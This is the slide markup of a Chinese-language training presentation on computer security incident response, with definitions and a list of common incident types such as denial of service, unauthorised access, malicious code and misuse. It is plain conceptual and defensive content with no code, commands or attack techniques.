        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5335367" y="1943791"/>
            <a:ext cx="2765025" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="66" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="68"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69"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70"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71"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67"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应急事件分类</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4932040" y="2006445"/>
            <a:ext cx="331319" cy="781626"/>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a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="73" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5335367" y="2495027"/>
            <a:ext cx="2765025" cy="437060"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="74" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="76"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77"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78"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79"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75"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应急响应流程</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383091288"/>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bwMode="gray">
          <a:xfrm>
            <a:off x="2123728" y="2492896"/>
            <a:ext cx="5112568"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itchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="457200" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="914400" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="1371600" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="1828800" algn="l" rtl="0" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>应急响应概述</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1071029955"/>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5CDE0-88FC-F74F-9E90-23BAF36977C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="576110" y="731112"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.1 </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>计算机安全事件</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19458" name="TextBox 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="586480" y="1479119"/>
            <a:ext cx="414846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800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>计算机安全事件是指由于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>自然</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>或者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>人为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，以及</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>软硬件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>本身</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>缺陷或故障</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>的原因，对信息系统造成危害，或者在信息系统内发生对社会造成负面影响的事件。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AE7D9C7-04A1-8449-964D-95F9138EE162}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="559256" y="2940092"/>
            <a:ext cx="8136904" cy="3139321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>常见的一些计算机安全事件如：</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窃取商业机密</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垃圾邮件或邮件骚扰；</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对计算机系统的未授权访问或非法入侵；</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盗用；</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拥有或分发非法内容（例如色情等）；</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拒绝服务（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>）攻击；</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商业关系的侵权冲突；</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敲诈；</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不当使用；</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其证据可存储在计算机介质中的任何非法行为（如欺骗、恐吓）等。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19460"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2" y="1235462"/>
            <a:ext cx="3345454" cy="2906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51210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9458"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19458"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1945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P spid="4"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91668C-145E-7B45-A756-603808096330}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179512" y="822060"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>计算机安全事件</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20482" name="TextBox 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="696995" y="1490964"/>
            <a:ext cx="66972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2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>一些常见的安全事件常见概念：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20483" name="TextBox 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="361695" y="3305129"/>
            <a:ext cx="383857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Tx/>
              <a:buNone/>
              <a:defRPr sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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sz="2400">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9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>拒绝服务攻击：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>通过消耗</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>、内存、带宽或磁盘空间等资源的方式来阻止和破坏已经经过授权的用户对网络、系统等的正常使用。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20484" name="TextBox 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="327422" y="2069307"/>
            <a:ext cx="383857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800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>非授权访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>：一个人在未经允许的情况下通过逻辑的或物理的方式访问网络、系统、应用、数据或其他资源，表现为一种入侵行为。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20485" name="TextBox 9"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4165998" y="2069307"/>
            <a:ext cx="4654474"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Tx/>
              <a:buNone/>
              <a:defRPr sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>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9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>恶意代码：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>指一种被隐蔽插入到另一个程序中的程序，能够感染主机的病毒、蠕虫、特洛伊木马或其他基于代码的恶意实体。其目的是破坏数据、执行破坏性和入侵性程序或破坏受害者数据的安全性和完整性。一般来说，恶意代码是用来在系统用户不知情的情况下实现其邪恶功能。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20486" name="TextBox 13"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="327422" y="5310008"/>
            <a:ext cx="390712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Tx/>
              <a:buNone/>
              <a:defRPr sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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sz="2400">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9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>复合型安全事件：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>一个单一安全事件中包含两种或两种以上的安全事件。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20487" name="TextBox 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="335281" y="4558198"/>
            <a:ext cx="383857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Tx/>
              <a:buNone/>
              <a:defRPr sz="1800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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sz="2400">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9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不当使用：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>用户违反计算资源使用政策的行为。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="图示 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4256221"/>
            <a:ext cx="3015307" cy="1896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32863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484"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20484"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="204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483"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20483"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2048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487"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20487"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="20" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2048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486"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20486"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
